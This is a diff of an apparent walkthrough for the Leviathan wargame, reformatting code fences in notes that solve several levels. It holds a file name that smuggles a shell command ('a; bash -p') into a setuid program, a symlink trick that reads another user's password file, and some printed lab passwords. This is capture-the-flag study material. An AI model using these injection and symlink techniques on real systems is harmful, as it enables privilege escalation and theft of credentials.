@@ -86,8 +86,10 @@ Solution:
 mkdir /tmp/<username>
 cd /tmp/<username>
 touch "a; bash -p"
+
 ~/printfile "a; bash -p"
 >>> switched to leviathan3@leviathan
+
 vim /etc/leviathan_pass/leviathan3
 ```
 
@@ -111,7 +113,8 @@ ls -l
 ls -l /tmp/sallycolly
 >>> total 16
 >>> -rw-r--r-- 1 leviathan1 root 13077 Dec 31 20:30 check.asm
-
+```
+```
 ls -l /etc/leviathan_pass/
 >>>
 total 32
@@ -140,7 +143,8 @@ system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
 <... system resumed> )                                                        = 0
 +++ exited (status 0) +++
 <<<
-
+```
+```
 ltrace ./printfile /etc/leviathan_pass/leviathan3
 >>>
 __libc_start_main(0x804852b, 2, 0xffffd6f4, 0x8048610 <unfinished ...>
@@ -225,11 +229,10 @@ Problem:
 Solution:
 ```
 ./level3
->>> 
-Enter the password> asdf
-bzzzzzzzzap. WRONG
-<<<
-
+>>> Enter the password> asdf
+>>> bzzzzzzzzap. WRONG
+```
+```
 ltrace ./level3
 >>>
 __libc_start_main(0x8048618, 1, 0xffffd744, 0x80486d0 <unfinished ...>
@@ -242,7 +245,8 @@ puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
 )                                        = 19
 +++ exited (status 0) +++
 <<<
-
+```
+```
 ./level3
 >>>
 Enter the password> snlprintf
@@ -303,22 +307,24 @@ Solution:
 ls -l
 >>> total 8
 >>> -r-sr-x--- 1 leviathan6 leviathan5 7560 Aug 26  2019 leviathan5
-
+```
+```
 ltrace ./leviathan5 
 >>>
- __libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 
- fopen("/tmp/file.log", "r")                  = 0
- puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
- )            = 26
- exit(-1 
- +++ exited (status 255) +++
- <<<
- 
- mkdir /tmp/file.log
- ltrace ./leviathan5 
- >>> PRINTS A LOT OF GIBBERISH NONSTOP
- 
- ^C
+__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 
+fopen("/tmp/file.log", "r")                  = 0
+puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
+)            = 26
+exit(-1 
++++ exited (status 255) +++
+<<<
+```
+```
+mkdir /tmp/file.log
+ltrace ./leviathan5 
+>>> PRINTS A LOT OF GIBBERISH NONSTOP
+
+^C
  
 ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
 ./leviathan5
@@ -347,7 +353,8 @@ Solution:
 
 ./leviathan6 1234
 >>> Wrong
-
+```
+```
 ltrace ./leviathan6 1234
 >>>
 __libc_start_main(0x804853b, 2, 0xffffd724, 0x80485e0 <unfinished ...>
